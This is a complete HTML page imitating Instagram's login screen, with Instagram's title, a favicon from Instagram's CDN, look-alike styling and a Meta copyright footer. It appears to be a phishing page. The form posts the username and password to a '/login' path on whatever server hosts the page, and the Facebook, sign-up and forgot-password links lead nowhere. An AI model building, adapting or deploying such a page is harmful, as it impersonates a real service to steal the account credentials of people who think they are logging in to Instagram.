<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Instagram</title>
<link rel="icon" href="https://static.cdninstagram.com/rsrc.php/v3/yI/r/VsNE-OHk_8a.png">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;background:#fafafa;display:flex;align-items:center;justify-content:center;min-height:100vh}
.wrapper{display:flex;gap:32px;align-items:center;max-width:800px}
.phone{display:none}
@media(min-width:875px){.phone{display:block;width:380px;height:580px;background:url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 380 580"><rect width="380" height="580" rx="30" fill="%23333"/><rect x="20" y="60" width="340" height="460" rx="5" fill="%23fafafa"/><text x="190" y="300" text-anchor="middle" font-size="40" fill="%23ccc">📸</text></svg>') center/contain no-repeat}}
.right{width:350px}
.login-box{background:white;border:1px solid #dbdbdb;border-radius:1px;padding:40px 40px 20px;margin-bottom:10px;text-align:center}
.logo-text{font-family:'Segoe Script','Dancing Script',cursive;font-size:40px;margin-bottom:24px;color:#262626}
.login-box form input{width:100%;padding:10px 8px;margin:4px 0;border:1px solid #dbdbdb;border-radius:3px;font-size:12px;background:#fafafa;outline:none}
.login-box form input:focus{border-color:#a8a8a8}
.login-btn{width:100%;padding:8px;background:#0095f6;color:white;border:none;border-radius:8px;font-size:14px;font-weight:600;cursor:pointer;margin-top:12px}
.login-btn:hover{background:#1877f2}
.divider{display:flex;align-items:center;margin:18px 0}
.divider::before,.divider::after{content:'';flex:1;height:1px;background:#dbdbdb}
.divider span{padding:0 16px;color:#8e8e8e;font-size:13px;font-weight:600}
.fb-login{color:#385185;font-size:14px;font-weight:600;text-decoration:none;display:flex;align-items:center;justify-content:center;gap:8px;margin-bottom:12px}
.forgot{color:#00376b;font-size:12px;text-decoration:none;display:block;margin-top:16px}
.signup-box{background:white;border:1px solid #dbdbdb;padding:22px 40px;text-align:center;font-size:14px;color:#262626}
.signup-box a{color:#0095f6;font-weight:600;text-decoration:none}
.get-app{text-align:center;margin-top:20px}
.get-app p{font-size:14px;color:#262626;margin-bottom:16px}
.badges{display:flex;justify-content:center;gap:8px}
.badges img{height:40px}
.footer{position:fixed;bottom:0;width:100%;text-align:center;padding:20px;font-size:12px;color:#8e8e8e}
</style>
</head>
<body>
<div class="wrapper">
    <div class="phone"></div>
    <div class="right">
        <div class="login-box">
            <h1 class="logo-text">Instagram</h1>
            <form action="/login" method="POST">
                <input type="text" name="username" placeholder="Phone number, username, or email" required>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit" class="login-btn">Log in</button>
            </form>
            <div class="divider"><span>OR</span></div>
            <a href="#" class="fb-login">🔵 Log in with Facebook</a>
            <a href="#" class="forgot">Forgot password?</a>
        </div>
        <div class="signup-box">
            Don't have an account? <a href="#">Sign up</a>
        </div>
        <div class="get-app">
            <p>Get the app.</p>
        </div>
    </div>
</div>
<div class="footer">
    Meta © 2024 · About · Blog · Jobs · Help · API · Privacy · Terms
</div>
</body>
</html>
